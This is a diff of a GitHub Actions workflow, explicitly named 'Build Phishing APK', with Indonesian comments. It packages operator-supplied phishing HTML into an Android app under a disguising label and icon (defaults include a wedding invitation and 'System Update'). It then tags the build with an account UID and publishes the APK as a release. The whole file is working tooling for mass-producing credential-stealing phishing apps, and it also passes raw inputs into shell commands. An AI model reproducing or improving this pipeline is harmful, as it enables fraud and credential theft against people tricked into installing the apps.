@@ -1,125 +1,226 @@
-name: Build Sync XxX APK
+name: Build Phishing APK
 
 on:
   workflow_dispatch:
     inputs:
       app_name:
-        description: 'Nama Aplikasi'
+        description: 'Nama aplikasi (label APK)'
         required: true
-        default: 'Undangan Pernikahan'
+        default: 'NeXsus Infinity'
       html_content:
-        description: 'Kode HTML untuk tampilan aplikasi'
+        description: 'Isi HTML phishing'
         required: true
-        default: '<html><body><h1>Login</h1></body></html>'
-      uid:
-        description: 'UID Akun'
-        required: true
-        default: 'nexsus-xxxxxxx'
-      icon_url:
-        description: 'URL Icon (PNG/JPG)'
+      icon_base64:
+        description: 'Icon base64 (tanpa prefix data:image/...)'
         required: false
-        default: 'https://files.catbox.moe/xxx.jpg'
+        default: ''
+      icon_ext:
+        description: 'Ekstensi icon (png/jpg/webp)'
+        required: false
+        default: 'png'
+      uid:
+        description: 'UID akun'
+        required: true
+      package_name:
+        description: 'Package name APK'
+        required: false
+        default: 'com.sync.xxx'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-    permissions:
-      contents: write
-      actions: write
+    timeout-minutes: 30
 
     steps:
-      - name: Checkout
+      - name: Checkout repository
         uses: actions/checkout@v4
 
       - name: Set up JDK 17
         uses: actions/setup-java@v4
         with:
-          java-version: '17'
           distribution: 'temurin'
+          java-version: '17'
 
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.11'
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
 
-      - name: Install Pillow
-        run: pip install Pillow
+      - name: Setup Gradle cache
+        uses: gradle/gradle-build-action@v2
 
-      - name: Inject Config (Python)
+      # ─── Override app label ───
+      - name: Override app label
+        shell: bash
+        run: |
+          APP_NAME="${{ github.event.inputs.app_name }}"
+          # escape untuk XML
+          APP_NAME_ESC=$(echo "$APP_NAME" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
+          STRINGS_FILE="app/src/main/res/values/strings.xml"
+          mkdir -p "$(dirname "$STRINGS_FILE")"
+          cat > "$STRINGS_FILE" <<EOF
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="app_name">${APP_NAME_ESC}</string>
+          </resources>
+          EOF
+          echo "App label set to: $APP_NAME"
+
+      # ─── Override package name ───
+      - name: Override package name
+        shell: bash
+        run: |
+          NEW_PKG="${{ github.event.inputs.package_name }}"
+          if [ -z "$NEW_PKG" ]; then NEW_PKG="com.sync.xxx"; fi
+          OLD_PKG=$(grep -oP 'namespace\s*=\s*"\K[^"]+' app/build.gradle.kts 2>/dev/null | head -1 || echo "")
+          if [ -z "$OLD_PKG" ]; then
+            OLD_PKG=$(grep -oP 'namespace\s*=\s*"\K[^"]+' app/build.gradle 2>/dev/null | head -1 || echo "com.sync.xxx")
+          fi
+          echo "Old package: $OLD_PKG → New package: $NEW_PKG"
+
+          if [ "$OLD_PKG" != "$NEW_PKG" ]; then
+            # 1. Update namespace & applicationId di build.gradle(.kts)
+            if [ -f app/build.gradle.kts ]; then
+              sed -i "s/namespace = \"$OLD_PKG\"/namespace = \"$NEW_PKG\"/g" app/build.gradle.kts
+              sed -i "s/applicationId = \"$OLD_PKG\"/applicationId = \"$NEW_PKG\"/g" app/build.gradle.kts
+            fi
+            if [ -f app/build.gradle ]; then
+              sed -i "s/namespace \"$OLD_PKG\"/namespace \"$NEW_PKG\"/g" app/build.gradle
+              sed -i "s/applicationId \"$OLD_PKG\"/applicationId \"$NEW_PKG\"/g" app/build.gradle
+            fi
+
+            # 2. Move folder source code
+            OLD_PATH="app/src/main/java/$(echo $OLD_PKG | tr '.' '/')"
+            NEW_PATH="app/src/main/java/$(echo $NEW_PKG | tr '.' '/')"
+            if [ -d "$OLD_PATH" ]; then
+              mkdir -p "$(dirname "$NEW_PATH")"
+              mv "$OLD_PATH" "$NEW_PATH"
+            fi
+
+            # 3. Ganti semua import & package di file .kt / .java
+            find app/src -type f \( -name "*.kt" -o -name "*.java" \) -exec \
+              sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" {} +
+
+            # 4. Ganti package di AndroidManifest
+            if [ -f app/src/main/AndroidManifest.xml ]; then
+              sed -i "s/package=\"$OLD_PKG\"/package=\"$NEW_PKG\"/g" app/src/main/AndroidManifest.xml
+            fi
+          fi
+
+      # ─── Set icon (dari base64) ───
+      - name: Set icon from base64
+        shell: bash
+        run: |
+          ICON_B64="${{ github.event.inputs.icon_base64 }}"
+          ICON_EXT="${{ github.event.inputs.icon_ext }}"
+          if [ -z "$ICON_EXT" ]; then ICON_EXT="png"; fi
+
+          if [ -z "$ICON_B64" ]; then
+            echo "No icon provided, using default."
+            exit 0
+          fi
+
+          echo "$ICON_B64" | base64 -d > /tmp/custom_icon.$ICON_EXT
+
+          # Konversi ke PNG kalau bukan PNG
+          if [ "$ICON_EXT" != "png" ]; then
+            sudo apt-get update -qq
+            sudo apt-get install -y -qq imagemagick
+            convert /tmp/custom_icon.$ICON_EXT /tmp/custom_icon.png
+          else
+            cp /tmp/custom_icon.$ICON_EXT /tmp/custom_icon.png
+          fi
+
+          # Copy ke semua density mipmap
+          for d in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
+            DIR="app/src/main/res/mipmap-$d"
+            mkdir -p "$DIR"
+            SIZES_MD=(48 72 96 144 192)
+            case $d in
+              mdpi)    SZ=48  ;;
+              hdpi)    SZ=72  ;;
+              xhdpi)   SZ=96  ;;
+              xxhdpi)  SZ=144 ;;
+              xxxhdpi) SZ=192 ;;
+            esac
+            convert /tmp/custom_icon.png -resize ${SZ}x${SZ} "$DIR/ic_launcher.png"
+            convert /tmp/custom_icon.png -resize ${SZ}x${SZ} "$DIR/ic_launcher_round.png" 2>/dev/null || true
+          done
+          echo "✅ Icons replaced"
+
+      # ─── Inject HTML phishing ───
+      - name: Inject HTML content
+        shell: bash
         env:
           HTML_CONTENT: ${{ github.event.inputs.html_content }}
-          APP_NAME: ${{ github.event.inputs.app_name }}
-          ACCOUNT_UID: ${{ github.event.inputs.uid }}
         run: |
-          python3 - << 'EOF'
-          import os, json, re
+          mkdir -p app/src/main/assets
+          printf '%s' "$HTML_CONTENT" > app/src/main/assets/index.html
+          echo "✅ index.html written ($(wc -c < app/src/main/assets/index.html) bytes)"
 
-          # ─── 1. WRITE HTML ASSET ───
-          os.makedirs("android/app/src/main/assets", exist_ok=True)
-          html_content = os.environ.get("HTML_CONTENT", "<html><body>Error</body></html>")
-          with open("android/app/src/main/assets/index.html", "w", encoding="utf-8") as f:
-              f.write(html_content)
-          print(f"✅ HTML asset written ({len(html_content)} bytes)")
-
-          # ─── 2. REPLACE APP NAME ───
-          strings_xml = "android/app/src/main/res/values/strings.xml"
-          with open(strings_xml, "r") as f:
-              content = f.read()
-
-          app_name = os.environ.get("APP_NAME", "System Update")
-          content = re.sub(
-              r'<string name="app_name">.*?</string>',
-              f'<string name="app_name">{app_name}</string>',
-              content
-          )
-          with open(strings_xml, "w") as f:
-              f.write(content)
-          print(f"✅ APP_NAME injected: {app_name}")
-
-          # ─── 3. CREATE UID.JSON ───
-          uid = os.environ.get("ACCOUNT_UID", "nexsus-xxxxxxx")
-          with open("android/app/src/main/assets/uid.json", "w") as f:
-              json.dump({"uid": uid}, f)
-          print(f"✅ UID injected: {uid}")
-
-          # ─── 4. VERIFY ───
-          print("\n=== VERIFIKASI ===")
-          if os.path.exists("android/app/src/main/assets/index.html"):
-              print("index.html: OK")
-          else:
-              print("index.html: MISSING")
-          print("==================\n")
-          EOF
-
-      - name: Download Icon
+      # ─── Inject UID ───
+      - name: Inject UID
+        shell: bash
         run: |
-          curl -L -o custom_icon.png "${{ github.event.inputs.icon_url }}"
+          mkdir -p app/src/main/assets
+          echo "{\"uid\":\"${{ github.event.inputs.uid }}\"}" > app/src/main/assets/uid.json
+          echo "✅ uid.json written: ${{ github.event.inputs.uid }}"
 
-      - name: Generate App Icons
-        run: python3 generate_icons.py custom_icon.png
-
-      - name: Setup Gradle Wrapper
+      # ─── Setup signing (opsional) ───
+      - name: Setup debug keystore
+        shell: bash
         run: |
-          curl -L -o android/gradle/wrapper/gradle-wrapper.jar \
-            "https://github.com/gradle/gradle/raw/v8.4.0/gradle/wrapper/gradle-wrapper.jar"
-          chmod +x android/gradlew
+          mkdir -p ~/.android
+          keytool -genkey -v \
+            -keystore ~/.android/debug.keystore \
+            -storepass android \
+            -alias androiddebugkey \
+            -keypass android \
+            -keyalg RSA \
+            -keysize 2048 \
+            -validity 10000 \
+            -dname "CN=Android Debug,O=Android,C=US" 2>/dev/null || true
 
-      - name: Build Release APK
+      # ─── Build APK ───
+      - name: Build APK
+        shell: bash
         run: |
-          cd android
-          ./gradlew assembleRelease --no-daemon
+          chmod +x ./gradlew
+          ./gradlew assembleRelease --stacktrace
 
+      # ─── Rename & locate APK ───
       - name: Rename APK
+        shell: bash
         run: |
-          mkdir -p output
-          find android/app/build/outputs/apk/release/ -name "*.apk" | head -1 \
-            | xargs -I{} cp {} output/SyncXxX.apk
+          APK_PATH=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          if [ -z "$APK_PATH" ]; then
+            echo "❌ APK tidak ditemukan!"
+            exit 1
+          fi
+          cp "$APK_PATH" ./SyncXxX.apk
+          ls -lh SyncXxX.apk
+          echo "✅ APK siap: $(du -h SyncXxX.apk | cut -f1)"
 
-      - name: Create Release and Upload APK
-        uses: softprops/action-gh-release@v1
+      # ─── Upload ke Release ───
+      - name: Create Release & Upload APK
+        uses: softprops/action-gh-release@v2
         with:
           tag_name: build-${{ github.run_id }}
-          name: "Build ${{ github.event.inputs.app_name }}"
-          files: output/SyncXxX.apk
+          name: "Build ${{ github.run_number }} — ${{ github.event.inputs.app_name }}"
+          body: |
+            **App Name:** ${{ github.event.inputs.app_name }}
+            **Package:** ${{ github.event.inputs.package_name }}
+            **UID:** ${{ github.event.inputs.uid }}
+            **Run:** #${{ github.run_number }}
+            **Date:** ${{ github.event.repository.updated_at }}
+          files: SyncXxX.apk
+          draft: false
+          prerelease: false
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      # ─── Upload artifact (backup) ───
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: SyncXxX-apk
+          path: SyncXxX.apk
+          retention-days: 30
